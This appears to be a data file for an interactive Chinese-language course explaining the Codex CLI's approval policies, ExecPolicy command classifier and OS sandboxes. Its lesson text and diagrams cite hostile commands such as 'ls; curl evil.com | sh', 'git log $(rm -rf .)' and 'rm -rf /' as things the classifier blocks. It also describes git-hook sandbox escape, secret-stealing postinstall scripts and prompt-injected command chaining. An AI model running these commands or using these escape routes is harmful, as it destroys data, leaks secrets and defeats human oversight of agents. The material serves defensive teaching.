          { id: 'a1', laneId: 'aud', start: 5, end: 42, label: 'ls / rg → 安全只读放行', tone: 'blue', status: 'done' },
          { id: 'a2', laneId: 'aud', start: 48, end: 92, label: '写文件 → 审批拦截 + 只读沙箱双阻断', tone: 'rose', status: 'blocked' },
        ],
      ),
    },
    {
      shortLabel: '.git 只读保护',
      badge: 'INSIGHT',
      title: '细节魔鬼：WorkspaceWrite 下为何还要把 .git 设为只读？',
      paragraphs: [
        '即使把写权限限制在当前项目目录，如果恶意或误操作命令往 `.git/hooks/pre-commit` 或 `.git/config` 写入脚本，下次开发者手工执行 `git commit` 时就会在**沙箱之外**触发任意代码执行！',
        '因此 Codex 的 `WorkspaceWrite` 策略专门在可写根目录内部挖出只读保护区（如 `.git` 和 `.codex`），堵死沙箱逃逸跳板。你可以在顶部切换到**「实验台」**亲自测试不同组合！',
      ],
      kpis: [
        kpi('保护目录', '.git / .codex 只读', 'good'),
        kpi('防御目标', '防止 Hook 注入逃逸', 'good'),
        kpi('互动实验', '顶部可切换实验台', 'good'),
      ],
      scene: iso(
        'WorkspaceWrite 内的只读保护区挖洞',
        [
          { id: 'root', x: 100, y: 120, label: '宿主根目录 /', sublabel: '默认只读（/etc, ~/.ssh 禁写）', tone: 'dark', size: 'lg', icon: 'hard-drive' },
          { id: 'ws', x: 460, y: 120, label: '项目目录 ./workspace', sublabel: '允许读写（源码 / target / dist）', tone: 'green', size: 'lg', active: true, icon: 'file-text' },
          { id: 'git', x: 460, y: 340, label: '.git & .codex', sublabel: '在可写区内再次加只读锁，防 Hook 投毒', tone: 'rose', size: 'lg', active: true, icon: 'lock' },
        ],
        [
          { from: 'root', to: 'ws', label: '开放局部可写', status: 'active', packetCount: 1 },
          { from: 'ws', to: 'git', label: '二次只读收敛', status: 'error', dashed: true, packetCount: 1, packetLabel: 'EACCES' },
        ],
      ),
    },
    {
      shortLabel: '会话级审批缓存',
      badge: 'TECHNIQUE',
      title: 'ReviewDecision::ApprovedForSession：避免审批疲劳',
      paragraphs: [
        '如果模型要连续跑 10 次 `pytest`，每次都弹窗只会让人麻木乱点。Codex 的审批响应支持 `Approved`（本次放行）、`ApprovedForSession`（本会话同类命令免再问）、`Denied`（拒绝并让模型换方案）、`Abort`（中止本轮）。',
      ],
      kpis: [
        kpi('放行粒度', '单次 / 本会话 / 拒绝', 'good'),
        kpi('拒绝反馈', '作为工具结果返还模型', 'good'),
        kpi('交互效率', '显著减少重复弹窗', 'good'),
      ],
      scene: iso(
        'ReviewDecision 四种人工决策分支',
        [
          { id: 'req', x: 70, y: 215, label: '审批弹窗', tone: 'orange', size: 'lg', active: true, icon: 'shield' },
          { id: 'd1', x: 470, y: 65, label: 'Approved', sublabel: '仅放行这一次', tone: 'green', icon: 'check-circle' },
          { id: 'd2', x: 470, y: 165, label: 'ApprovedForSession', sublabel: '写入会话白名单缓存', tone: 'blue', active: true, icon: 'database' },
          { id: 'd3', x: 470, y: 265, label: 'Denied', sublabel: '返回拒绝理由，模型继续调整', tone: 'orange', icon: 'alert-triangle' },
          { id: 'd4', x: 470, y: 365, label: 'Abort', sublabel: '立即中止当前 Turn', tone: 'rose', icon: 'pause' },
        ],
        [
          { from: 'req', to: 'd1', packetCount: 1 },
          { from: 'req', to: 'd2', status: 'active', packetCount: 1 },
          { from: 'req', to: 'd3', dashed: true, packetCount: 1 },
          { from: 'req', to: 'd4', status: 'error', dashed: true, packetCount: 1 },
        ],
      ),
    },
    {
      shortLabel: '策略复盘',
      badge: 'RECAP',
      title: '双正交安全矩阵复盘',
      paragraphs: [
        '把「审批（谁批准）」和「沙箱（内核允许什么）」正交解耦，是 Codex 能同时胜任本地交互编程和 CI 自动修复的根本前提。',
      ],
      recapTable: [
        { question: '为何把 AskForApproval 与 SandboxPolicy 拆开？', decision: '治理面与物理面正交组合', because: '即使无人值守（never），内核沙箱仍能物理兜底防止越界与外泄。' },
        { question: 'WorkspaceWrite 为何单独锁死 .git？', decision: '可写工作区内对 .git/.codex 再次设为只读', because: '阻断通过修改 git hooks 在沙箱外触发任意代码的提权链路。' },
        { question: '如何避免高频审批导致用户盲目点确认？', decision: '支持 ApprovedForSession 会话级缓存 + ExecPolicy 前缀规则', because: '只把真正异常的边界操作留给人类注意力。' },
      ],
      kpis: [
        kpi('安全维度', '2D 正交', 'good'),
        kpi('默认断网', '是', 'good'),
        kpi('互动体验', '可切实验台模拟', 'good'),
      ],
      scene: iso('策略矩阵复盘', [
        { id: 'a', x: 200, y: 200, label: 'AskForApproval', tone: 'orange' },
        { id: 'b', x: 500, y: 200, label: 'SandboxPolicy', tone: 'violet', active: true },
        { id: 'c', x: 800, y: 200, label: '安全执行', tone: 'green' },
      ], [
        { from: 'a', to: 'b', packetCount: 1 },
        { from: 'b', to: 'c', packetCount: 1 },
      ]),
    },
  ]),
);

// ---------------------------------------------------------------------------
// CH2 · 2/2 · ExecPolicy 规则引擎与安全命令分类器
// ---------------------------------------------------------------------------
const L_CODEX_EXEC_POLICY = lesson(
  'codex-exec-policy',
  'codex-ch03',
  3,
  '二维正交策略与 ExecPolicy',
  2,
  2,
  'ExecPolicy 规则引擎：命令语法树解析与前缀放行',
  '只靠正则匹配 Shell 字符串极易被管道或子命令绕过。Codex 用 bash AST 解析器拆解命令结构，再交由 Starlark/ExecPolicy 规则评估风险。',
  10,
  '进阶',
  [
    { text: '理解为什么简单正则无法安全判断一条 Shell 命令是否只读', completedAtStep: 2 },
    { text: '掌握 is_safe_command 如何解析管道、重定向与命令替换', completedAtStep: 4 },
    { text: '了解团队如何通过 ExecPolicy 规则文件声明 allow / prompt / forbidden', completedAtStep: 6 },
  ],
  steps([
    {
      shortLabel: '正则绕过陷阱',
      badge: 'PROBLEM',
      title: 'ls ./src && rm -rf / —— 正则开头匹配就翻车',
      paragraphs: [
        '如果审批器只检查命令是否以 `ls`、`cat` 或 `git status` 开头，模型（或间接 Prompt 注入）只要拼上 `ls; curl evil.com | sh` 或 `git log $(rm -rf .)`，简单白名单瞬间失守。',
        'Codex 在 `codex-rs/core/src/is_safe_command.rs` 和 `codex-execpolicy` 中，先用真实 Shell 语法解析器把命令拆成抽象语法树（AST）和独立子命令，再逐条校验。',
      ],
      kpis: [
        kpi('解析方式', 'Shell AST 拆解', 'good'),
        kpi('检查粒度', '每个管道段与子命令', 'good'),
        kpi('默认兜底', '未识别一律不放行', 'good'),
      ],
      scene: iso(
        '正则匹配 vs Shell AST 安全分析',
        [
          { id: 'raw', x: 70, y: 215, label: 'Shell 命令串', sublabel: 'git status && curl bad.io | sh', tone: 'orange', size: 'lg', icon: 'terminal' },
          { id: 'ast', x: 410, y: 215, label: 'Bash AST 解析器', sublabel: '拆解为 [git status] + [curl] + [sh]', tone: 'violet', size: 'lg', active: true, icon: 'git-branch' },
          { id: 'ok', x: 760, y: 105, label: '全部段安全 → Allow', tone: 'green', dimmed: true, icon: 'check-circle' },
          { id: 'bad', x: 760, y: 315, label: '命中未知/写操作 → Prompt/Deny', tone: 'rose', active: true, icon: 'shield' },
        ],
        [
          { from: 'raw', to: 'ast', status: 'active', packetCount: 1 },
          { from: 'ast', to: 'ok', dashed: true, packetCount: 0 },
          { from: 'ast', to: 'bad', label: 'curl/sh 越界', status: 'error', packetCount: 2, packetLabel: '拦截' },
        ],
      ),
    },
    {
      shortLabel: '危险子参数识别',
      badge: 'TECHNIQUE',
      title: '连 find 和 git 都要细分到具体参数！',
      paragraphs: [
        '同样是 `find`，`find src -name "*.rs"` 是纯只读的，但 `find . -exec rm {} +` 或 `-delete` 是破坏性的；同样是 `git`，`git diff` 是只读的，但 `git push --force` 或 `git -c core.sshCommand=...` 则是危险的。',
        'Codex 的已知安全命令分类器不仅看二进制名，还严格白名单校验子命令与危险标志位，宁可多问一次绝不漏放。',
      ],
      sourceDrawer: codexSrc(
        '命令安全分类与 ExecPolicy 规则评估示意',
        'codex-rs/core/src/is_safe_command.rs',
        'rs',
        `pub fn is_known_safe_command(command: &[String]) -> bool {
    let Some(cmd0) = command.first().map(String::as_str) else { return false };
    match cmd0 {
        "cat" | "ls" | "pwd" | "rg" | "head" | "tail" | "wc" => true,
        "git" => matches!(
            command.get(1).map(String::as_str),
            Some("status" | "log" | "diff" | "show" | "branch")
        ) && !has_dangerous_git_flag(command),
        "find" => !command.iter().any(|a| matches!(a.as_str(), "-delete" | "-exec" | "-execdir")),
        _ => false,
    }
}`,
        '按词元数组精确检查子命令与危险标志，防止 find -exec / git -c 提权绕过。',
      ),
      kpis: [
        kpi('参数级审查', 'find -exec / git -c', 'good'),
        kpi('重定向检测', '含 > / >> 视为写操作', 'good'),
        kpi('Fail-Closed', '未知参数默认 false', 'good'),
      ],
      scene: iso(
        '参数级深度审查规则',
        [
          { id: 'c1', x: 80, y: 95, label: 'find src -name "*.ts"', tone: 'green', icon: 'check-circle' },
          { id: 'c2', x: 80, y: 215, label: 'find . -exec rm {} +', tone: 'rose', icon: 'alert-triangle' },
          { id: 'c3', x: 80, y: 335, label: 'cat a.txt > b.txt', tone: 'orange', icon: 'alert-triangle' },
          { id: 'chk', x: 460, y: 215, label: 'is_known_safe_command()', sublabel: '检查子命令 + 危险 Flag + 重定向', tone: 'violet', size: 'lg', active: true, icon: 'shield' },
          { id: 'out', x: 800, y: 215, label: 'Safe / NeedsApproval', tone: 'blue', icon: 'layers' },
        ],
        [
          { from: 'c1', to: 'chk', status: 'active', packetCount: 1 },
          { from: 'c2', to: 'chk', status: 'error', packetCount: 1 },
          { from: 'c3', to: 'chk', status: 'error', packetCount: 1 },
          { from: 'chk', to: 'out', status: 'active', packetCount: 1 },
        ],
      ),
    },
    {
      shortLabel: 'ExecPolicy 声明规则',
      badge: 'SOLUTION',
      title: 'codex-execpolicy：声明式 prefix_rule 统一团队红线',
      paragraphs: [
        '除了内置安全表，企业与团队还可以在配置目录编写 ExecPolicy 规则，为命令前缀明确指定三态决策：`allow`（放行）、`prompt`（必须人工审批）、`forbidden`（硬禁止，哪怕沙箱开启也绝不执行，如 `git push --force` 或 `rm -rf`）。',
      ],
      kpis: [
        kpi('三态决策', 'allow / prompt / forbidden', 'good'),
        kpi('最高优先级', 'forbidden 优先于一切', 'good'),
        kpi('可版本化', '随仓库共享给团队', 'neutral'),
      ],
      scene: iso(
        'ExecPolicy 三态决策树',
        [
          { id: 'cmd', x: 70, y: 215, label: '待执行命令', tone: 'blue', size: 'lg', icon: 'terminal' },
          { id: 'pol', x: 390, y: 215, label: 'ExecPolicy 引擎', sublabel: '多规则命中取最严格者', tone: 'violet', size: 'lg', active: true, icon: 'shield' },
          { id: 'al', x: 750, y: 90, label: 'allow → 直接入沙箱', tone: 'green', icon: 'check-circle' },
          { id: 'pr', x: 750, y: 215, label: 'prompt → 人工审批', tone: 'orange', icon: 'pause' },
          { id: 'fb', x: 750, y: 340, label: 'forbidden → 硬拒绝', tone: 'rose', icon: 'alert-triangle' },
        ],
        [
          { from: 'cmd', to: 'pol', status: 'active', packetCount: 1 },
          { from: 'pol', to: 'al', packetCount: 1 },
          { from: 'pol', to: 'pr', status: 'active', packetCount: 1 },
          { from: 'pol', to: 'fb', status: 'error', dashed: true, packetCount: 1 },
        ],
      ),
    },
    {
      shortLabel: '最严原则合并',
      badge: 'INSIGHT',
      title: '复合命令命中多条规则时：取最严格判定',
      paragraphs: [
        '一条复合命令 `rg TODO src && npm run build && git push` 拆开后包含 3 个子命令：第一个是 `allow`，第二个是 `prompt`，第三个是 `forbidden`。',
        'ExecPolicy 按严格度序 `forbidden > prompt > allow` 归约：只要任何一个子命令命中 `forbidden`，整条命令直接拒绝，绝不会被前面的安全前缀“洗白”。',
      ],
      kpis: [
        kpi('严格度序', 'forbidden > prompt > allow', 'good'),
        kpi('前缀洗白', '完全免疫', 'good'),
        kpi('组合安全', '逐段归约', 'good'),
      ],
      scene: swim(
        '复合命令逐段评估与最严归约',
        [
          { id: 's1', label: '段1: rg TODO', tone: 'green' },
          { id: 's2', label: '段2: npm build', tone: 'orange' },
          { id: 's3', label: '段3: git push', tone: 'rose' },
          { id: 'fin', label: '最终归约', tone: 'violet' },
        ],
        [
          { id: 'b1', laneId: 's1', start: 5, end: 35, label: 'allow', tone: 'green', status: 'done' },
          { id: 'b2', laneId: 's2', start: 20, end: 52, label: 'prompt', tone: 'orange', status: 'done' },
          { id: 'b3', laneId: 's3', start: 38, end: 68, label: 'forbidden', tone: 'rose', status: 'blocked' },
          { id: 'b4', laneId: 'fin', start: 72, end: 96, label: 'max(allow, prompt, forbidden) = forbidden', tone: 'rose', status: 'blocked' },
        ],
      ),
    },
    {
      shortLabel: '沙箱仍做最后防线',
      badge: 'INSIGHT',
      title: 'ExecPolicy 通过 ≠ 撤掉内核沙箱',
      paragraphs: [
        '即使一条命令在 ExecPolicy 判定为 `allow`（或用户点了允许），它默认仍然在 `SandboxPolicy` 的操作系统沙箱内运行。语法分析解决的是「意图审查与防误操作」，内核沙箱解决的是「即使命令内部藏了恶意脚本也打不穿物理边界」。',
      ],
      kpis: [
        kpi('防线一', 'AST + ExecPolicy 意图审查', 'good'),
        kpi('防线二', 'OS 内核物理围栏', 'good'),
        kpi('纵深防御', '双层叠加', 'good'),
      ],
      scene: iso(
        '意图审查 + 物理沙箱纵深防御',
        [
          { id: 'g1', x: 100, y: 210, label: '1 · ExecPolicy (AST)', sublabel: '拦截显式高危意图', tone: 'orange', size: 'lg', icon: 'shield' },
          { id: 'g2', x: 430, y: 210, label: '2 · OS Sandbox', sublabel: '拦截隐蔽越界读写/联网', tone: 'violet', size: 'lg', active: true, icon: 'lock' },
          { id: 'ok', x: 760, y: 210, label: '受控子进程执行', tone: 'green', size: 'lg', icon: 'terminal' },
        ],
        [
          { from: 'g1', to: 'g2', status: 'active', packetCount: 1 },
          { from: 'g2', to: 'ok', status: 'active', packetCount: 1 },
        ],
      ),
    },
    {
      shortLabel: '规则引擎复盘',
      badge: 'RECAP',
      title: 'ExecPolicy 规则引擎复盘',
      paragraphs: [
        '从字符串正则升级为 Shell AST 拆解 + 参数级审查 + 最严原则归约，是工业级 Coding Agent 审批器的必经之路。',
      ],
      recapTable: [
        { question: '为什么不能用 startsWith("ls") 判断安全命令？', decision: '必须先做 Shell AST 解析拆出所有管道与子命令', because: '单靠前缀匹配会被 &&、;、|、$() 和重定向轻易绕过。' },
        { question: '复合命令包含多个动作时怎么裁决？', decision: '按 forbidden > prompt > allow 取最严格结果', because: '防止安全命令包装危险命令实现「前缀洗白」。' },
        { question: 'ExecPolicy 与 OS 沙箱是什么关系？', decision: '纵深叠加，而非二选一', because: '哪怕看似无害的脚本（如 pytest）内部也可能藏着越界读写，需要 OS 沙箱兜底。' },
      ],
      kpis: [
        kpi('语法解析', 'Shell AST', 'good'),
        kpi('归约原则', '最严优先', 'good'),
        kpi('防线层次', '双层叠加', 'good'),
      ],
      scene: iso('ExecPolicy 复盘', [
        { id: 'a', x: 200, y: 200, label: 'Shell AST', tone: 'violet' },
        { id: 'b', x: 500, y: 200, label: 'ExecPolicy', tone: 'orange', active: true },
        { id: 'c', x: 800, y: 200, label: 'OS Sandbox', tone: 'green' },
      ], [
        { from: 'a', to: 'b', packetCount: 1 },
        { from: 'b', to: 'c', packetCount: 1 },
      ]),
    },
  ]),
);

// ---------------------------------------------------------------------------
// CH3 · 1/2 · macOS Seatbelt 与 Linux Landlock/seccomp 内核沙箱
// ---------------------------------------------------------------------------
const L_CODEX_SANDBOX = lesson(
  'codex-seatbelt-landlock',
  'codex-ch04',
  4,
  'OS 原生内核沙箱与零信任',
  1,
  2,
  'OS 级物理沙箱：Seatbelt 与 Landlock/seccomp',
  '为什么 Codex 不要求你先装 Docker 就能做到零信任隔离？因为它直接调用宿主操作系统的原生内核沙箱机制。',
  12,
  '进阶',
  [
    { text: '理解 macOS Seatbelt (sandbox-exec) 动态生成 SBPL 策略文件的原理', completedAtStep: 2 },
    { text: '掌握 Linux Landlock LSM（文件系统限制）+ seccomp-bpf（断网限制）双核机制', completedAtStep: 4 },
    { text: '说出原生内核沙箱相比 Docker 容器的启动开销与权限优势', completedAtStep: 6 },
  ],
  steps([
    {
      shortLabel: '为何不用 Docker',
      badge: 'PROBLEM',
      title: '本地开发机上，每次跑 ls 都起 Docker 容器现实吗？',
      paragraphs: [
        '开发者本地已经装好了 Rust/Node/Python 工具链、缓存和私有依赖。如果每次工具调用都拉容器，不仅启动慢、环境镜像难同步，还需要宿主机装 Docker 守护进程。',
        'Codex 选择零容器的**操作系统原生内核沙箱**：毫秒级启动、直接复用本机编译器，同时在内核系统调用层物理封死越界写盘与外网连接。',
      ],
      kpis: [
        kpi('macOS 引擎', 'Seatbelt (SBPL)', 'good'),
        kpi('Linux 引擎', 'Landlock + seccomp', 'good'),
        kpi('启动开销', '毫秒级（无需容器）', 'good'),
      ],
      scene: iso(
        'Codex 跨平台原生内核沙箱分发',
        [
          { id: 'exec', x: 80, y: 215, label: 'codex-core Exec', sublabel: '接收 SandboxPolicy', tone: 'violet', size: 'lg', active: true, icon: 'cpu' },
          { id: 'mac', x: 480, y: 95, label: 'macOS: Seatbelt', sublabel: 'sandbox-exec -p <SBPL> 限制文件与网络', tone: 'blue', size: 'lg', active: true, icon: 'lock' },
          { id: 'lin', x: 480, y: 225, label: 'Linux: Landlock + seccomp', sublabel: '非特权 LSM 锁目录 + BPF 禁外网 socket', tone: 'green', size: 'lg', active: true, icon: 'lock' },
          { id: 'win', x: 480, y: 355, label: 'Windows: Restricted Token', sublabel: 'Job Object + AppContainer/受限令牌', tone: 'orange', size: 'lg', icon: 'shield' },
        ],
        [
          { from: 'exec', to: 'mac', status: 'active', packetCount: 1 },
          { from: 'exec', to: 'lin', status: 'active', packetCount: 1 },
          { from: 'exec', to: 'win', dashed: true, packetCount: 1 },
        ],
      ),
    },
    {
      shortLabel: 'macOS Seatbelt',
      badge: 'TECHNIQUE',
      title: 'seatbelt.rs：动态拼装 SBPL 规则包裹子进程',
      paragraphs: [
        '在 macOS 上，`codex-rs/core/src/seatbelt.rs` 会把 `SandboxPolicy` 编译为一段 Scheme 风格的 Seatbelt Profile Language（SBPL）规则，通过 `/usr/bin/sandbox-exec` 注入内核 MAC 框架。',
        '规则以 `(deny default)` 起手，仅显式放开只读系统库、工作区 `subpath` 写权限（并排除 `.git`），网络默认完全不放行；一旦子进程尝试 `open(O_WRONLY)` 越界文件或 `connect()` 连外网，macOS 内核直接返回 `EPERM`。',
      ],
      sourceDrawer: codexSrc(
        'macOS Seatbelt SBPL 动态策略生成示意',
        'codex-rs/core/src/seatbelt.rs',
        'rs',
        `// 以最小权限 (deny default) 构造 macOS Seatbelt 策略
let mut policy = String::from("(version 1)\\n(deny default)\\n");
policy.push_str("(allow file-read*)\\n");
if let SandboxPolicy::WorkspaceWrite { writable_roots, network_access } = sandbox {
    for root in writable_roots {
        // 仅放开工作区 subpath 写入，且显式排除 .git 只读保护区
        policy.push_str(&format!(
            "(allow file-write* (require-all (subpath \\"{}\\") (require-not (subpath \\"{}/.git\\"))))\\n",
            root.display(), root.display()
        ));
    }
    if *network_access { policy.push_str("(allow network-outbound)\\n"); }
}`,
        '依据 codex-rs macOS Seatbelt 沙箱最小权限构造逻辑整理。',
      ),
      kpis: [
        kpi('起手策略', '(deny default)', 'good'),
        kpi('拦截层', 'macOS Kernel MAC', 'good'),
        kpi('继承特性', '所有孙进程自动继承', 'good'),
      ],
      scene: iso(
        'macOS Seatbelt 进程树继承特性',
        [
          { id: 'sb', x: 80, y: 210, label: 'sandbox-exec', sublabel: '加载 SBPL 策略进入内核', tone: 'blue', size: 'lg', active: true, icon: 'lock' },
          { id: 'sh', x: 410, y: 210, label: 'bash -lc "..."', sublabel: '受控子进程', tone: 'violet', icon: 'terminal' },
          { id: 'py', x: 740, y: 110, label: 'pytest / node / cargo', sublabel: '孙进程不可逆继承同一沙箱', tone: 'green', icon: 'cpu' },
          { id: 'net', x: 740, y: 315, label: 'curl ~/.ssh → 内核 EPERM', sublabel: '物理阻断，无法绕过', tone: 'rose', icon: 'alert-triangle' },
        ],
        [
          { from: 'sb', to: 'sh', status: 'active', packetCount: 1 },
          { from: 'sh', to: 'py', status: 'active', packetCount: 1 },
          { from: 'sh', to: 'net', status: 'error', dashed: true, packetCount: 1, packetLabel: 'DENIED' },
        ],
      ),
    },
    {
      shortLabel: 'Linux Landlock + seccomp',
      badge: 'SOLUTION',
      title: 'linux-sandbox：无需 root 的内核级双锁机制',
      paragraphs: [
        '在 Linux 上，Codex 借助专门的 `codex-linux-sandbox` 包装器，在 `execve` 真正拉起用户命令之前的极短窗口内，先后锁上两把不可逆的内核锁：',
        '1. **Landlock LSM**：无需 root 权限，在内核路径解析层限制当前进程及全部后代只能写入指定工作区目录；2. **seccomp-bpf**：在系统调用入口过滤 `socket` / `connect` 等网络 syscall，物理断网！',
      ],
      kpis: [
        kpi('文件围栏', 'Landlock LSM (非特权)', 'good'),
        kpi('网络围栏', 'seccomp-bpf 系统调用过滤', 'good'),
        kpi('不可逆性', 'PR_SET_NO_NEW_PRIVS', 'good'),
      ],
      scene: swim(
        'codex-linux-sandbox 启动前的双锁加锁时序',
        [
          { id: 'wrap', label: 'linux-sandbox 包装器', tone: 'violet' },
          { id: 'kern', label: 'Linux Kernel', tone: 'blue' },
          { id: 'cmd', label: '目标命令 (cargo/npm)', tone: 'green' },
        ],
        [
          { id: 'w1', laneId: 'wrap', start: 5, end: 28, label: 'PR_SET_NO_NEW_PRIVS', tone: 'orange', status: 'done' },
          { id: 'w2', laneId: 'kern', start: 30, end: 52, label: 'landlock_restrict_self() 锁目录', tone: 'blue', status: 'done' },
          { id: 'w3', laneId: 'kern', start: 54, end: 74, label: 'seccomp_load() 锁外网 syscall', tone: 'violet', status: 'done' },
          { id: 'w4', laneId: 'cmd', start: 76, end: 96, label: 'execve() 原地变身受限命令', tone: 'green', status: 'running' },
        ],
      ),
    },
    {
      shortLabel: '为何锁不可逆',
      badge: 'INSIGHT',
      title: 'PR_SET_NO_NEW_PRIVS：子进程永远无法给自己解锁',
      paragraphs: [
        'Linux 内核规定：一旦进程设置了 `no_new_privs` 并挂上 Landlock + seccomp，该进程及其后续 `fork`/`exec` 出的任意子进程（包括 `sudo` 或 setuid 程序）都**无法撤销**规则，也无法提权。',
        '哪怕代码仓库的 `package.json` `postinstall` 脚本里藏了供应链投毒，在 Codex 沙箱里也既偷不了 `~/.ssh`、也连不上外网 C2 服务器。',
      ],
      kpis: [
        kpi('setuid 提权', '内核彻底禁用', 'good'),
        kpi('供应链防御', '防 postinstall 窃密', 'good'),
        kpi('性能损耗', '接近 0%', 'good'),
      ],
      scene: iso(
        '供应链投毒在内核沙箱下的防御效果',
        [
          { id: 'pkg', x: 80, y: 215, label: '恶意测试/构建脚本', sublabel: '试图写 ~/.bashrc 并 curl 回传', tone: 'rose', size: 'lg', icon: 'alert-triangle' },
          { id: 'll', x: 440, y: 110, label: 'Landlock 拦截写盘', sublabel: '~/.bashrc 不在 writable_roots → EACCES', tone: 'blue', size: 'lg', active: true, icon: 'lock' },
          { id: 'sc', x: 440, y: 320, label: 'seccomp 拦截外联', sublabel: 'connect(AF_INET) → EPERM', tone: 'violet', size: 'lg', active: true, icon: 'shield' },
          { id: 'safe', x: 780, y: 215, label: '宿主机零受损', tone: 'green', icon: 'check-circle' },
        ],
        [
          { from: 'pkg', to: 'll', status: 'error', packetCount: 1 },
          { from: 'pkg', to: 'sc', status: 'error', packetCount: 1 },
          { from: 'll', to: 'safe', status: 'active', packetCount: 1 },
          { from: 'sc', to: 'safe', status: 'active', packetCount: 1 },
        ],
      ),
    },
    {
      shortLabel: '对比表',
      badge: 'INSIGHT',
      title: '原生内核沙箱 vs Docker 容器取舍',
      paragraphs: [
        '原生内核沙箱（Seatbelt / Landlock）胜在零额外安装、毫秒启动、无缝复用本地编译器与环境变量；而云端 Codex 任务（Codex Cloud）则运行在独立远端容器/微虚拟机中——两者针对本地与云端分别取最优解。',
      ],
      kpis: [
        kpi('本地 CLI', 'Seatbelt / Landlock', 'good'),
        kpi('云端后台任务', '独立云容器隔离', 'neutral'),
        kpi('安全基线', '默认只写工作区 + 断网', 'good'),
      ],
      scene: iso(
        '本地内核沙箱 vs 云端容器双形态',
        [
          { id: 'loc', x: 120, y: 205, label: '本地 Codex CLI', sublabel: 'Seatbelt / Landlock · 毫秒级复用本地工具链', tone: 'green', size: 'lg', active: true, icon: 'terminal' },
          { id: 'cld', x: 560, y: 205, label: '云端 Codex 环境', sublabel: '独立预热容器 · 异步并行跑多条 PR 任务', tone: 'blue', size: 'lg', icon: 'globe' },
        ],
        [{ from: 'loc', to: 'cld', label: '共享同一安全理念：先隔离再放手', dotted: true, packetCount: 1 }],
      ),
    },
    {
      shortLabel: '沙箱复盘',
      badge: 'RECAP',
      title: 'OS 级物理沙箱复盘',
      paragraphs: [
        '把安全防线建在 OS 内核层而不是提示词里，是 Codex 敢于在本地默认高自治执行命令的底气来源。',
      ],
      recapTable: [
        { question: 'macOS 上 Codex 如何物理锁死子进程？', decision: '动态生成 SBPL 规则交给 sandbox-exec (Seatbelt)', because: '以 (deny default) 起手，内核强制拦截越界写与外网。' },
        { question: 'Linux 上无需 root 怎么同时锁文件与网络？', decision: 'Landlock LSM 锁目录 + seccomp-bpf 禁外网 syscall', because: '配合 PR_SET_NO_NEW_PRIVS 不可逆继承给整棵进程树。' },
        { question: '为什么说原生沙箱比纯审批更可靠？', decision: '即使合法构建脚本内部藏毒也突破不了物理围栏', because: '人类肉眼审不完几万行依赖代码，内核围栏零遗漏。' },
      ],
      kpis: [
        kpi('macOS', 'Seatbelt', 'good'),
        kpi('Linux', 'Landlock + seccomp', 'good'),
        kpi('不可逆继承', '全进程树', 'good'),
      ],
      scene: iso('沙箱复盘', [
        { id: 'a', x: 200, y: 200, label: 'SandboxPolicy', tone: 'violet' },
        { id: 'b', x: 500, y: 200, label: 'Seatbelt / Landlock', tone: 'blue', active: true },
        { id: 'c', x: 800, y: 200, label: 'EPERM / EACCES', tone: 'green' },
      ], [
        { from: 'a', to: 'b', packetCount: 1 },
        { from: 'b', to: 'c', packetCount: 1 },
      ]),
    },
  ]),
);

// ---------------------------------------------------------------------------
// CH3 · 2/2 · 沙箱拒绝后的升级重试与网络零信任
// ---------------------------------------------------------------------------
const L_CODEX_ESCALATION = lesson(
  'codex-sandbox-escalation',
  'codex-ch04',
  4,
  'OS 原生内核沙箱与零信任',
  2,
  2,
  '沙箱拒绝后的升级重试与网络零信任',
  '默认断网又锁目录，那真需要 npm install 或写全局缓存时怎么办？Codex 用「先沙箱试跑 → 识别沙箱拒绝 → 审批升级重跑」闭环优雅解决。',
  9,
  '进阶',
  [
    { text: '理解「先在沙箱内乐观试跑，失败后再按需申请提权」的 UX 与安全收益', completedAtStep: 2 },
    { text: '掌握 is_likely_sandbox_denied 如何识别沙箱拦截与普通业务报错', completedAtStep: 4 },
    { text: '理解默认断网如何切断间接 Prompt 注入的数据外泄通道', completedAtStep: 6 },
  ],
  steps([
    {
      shortLabel: '断网的现实摩擦',
      badge: 'PROBLEM',
      title: '默认断网很安全，但真要装包或查 API 怎么办？',
      paragraphs: [
        '写代码时 90% 的命令（编译、单测、grep、git diff）根本不需要联网或写 `/tmp` 之外的系统目录；但剩下 10%（例如 `npm install`、`cargo fetch`、`docker ps`）确实需要越过沙箱边界。',
        '如果一开始就全放开，安全形同虚设；如果彻底不允许升级，用户只能切出去手动跑。',
      ],
      kpis: [
        kpi('90% 命令', '沙箱内零弹窗直接完成', 'good'),
        kpi('10% 越界命令', '精准识别 → 审批后升级', 'good'),
        kpi('默认网络', '关闭（零信任）', 'good'),
      ],
      scene: iso(
        '乐观沙箱试跑 → 按需提权闭环',
        [
          { id: 'run', x: 70, y: 210, label: '1 · 沙箱内乐观试跑', sublabel: 'WorkspaceWrite + 断网', tone: 'green', size: 'lg', active: true, icon: 'lock' },
          { id: 'det', x: 410, y: 210, label: '2 · 沙箱拒绝检测', sublabel: 'exit != 0 且命中 EPERM / Read-only', tone: 'orange', size: 'lg', active: true, icon: 'eye' },
          { id: 'ask', x: 750, y: 105, label: '3 · 弹窗请求提权', sublabel: '人工批准后单次无沙箱重跑', tone: 'violet', icon: 'shield' },
          { id: 'ret', x: 750, y: 315, label: '普通编译报错 → 直接返给模型', tone: 'blue', icon: 'terminal' },
        ],
        [
          { from: 'run', to: 'det', status: 'active', packetCount: 1 },
          { from: 'det', to: 'ask', label: '是沙箱拦截', status: 'active', packetCount: 1, packetLabel: 'Escalate' },
          { from: 'det', to: 'ret', label: '是代码报错', dashed: true, packetCount: 1 },
        ],
      ),
    },
    {
      shortLabel: '检测沙箱拒绝',
      badge: 'TECHNIQUE',
      title: 'is_likely_sandbox_denied：区分「代码写错了」和「被沙箱拦了」',
      paragraphs: [
        '沙箱内命令返回非零退出码有两种截然不同的原因：要么是单测真的挂了（此时应该直接把 stderr 交给模型修代码，不要打扰人类），要么是沙箱阻止了系统调用（`Operation not permitted`、`Read-only file system`、Seatbelt/Landlock 特征码）。',
        'Codex 在执行层检测这些特征，结合 `AskForApproval` 策略决定是否发起升级审批。',
      ],
      sourceDrawer: codexSrc(
        '沙箱拒绝判定与升级重试流程示意',
        'codex-rs/core/src/exec.rs',
        'rs',
        `let output = run_in_sandbox(&params, &sandbox_policy).await?;
if is_likely_sandbox_denied(&output) && approval_policy.allows_escalation() {
    let decision = sess.request_exec_approval(
        call_id, &params.command, Some("沙箱拦截，请求在宿主权限下重试")
    ).await;
    if matches!(decision, ReviewDecision::Approved | ReviewDecision::ApprovedForSession) {
        return run_unsandboxed(&params).await;
    }
}`,
        '仅当确实触发沙箱物理拦截且策略允许升级时，才向人类发出单次提权请求。',
      ),
      kpis: [
        kpi('误弹窗率', '极低', 'good'),
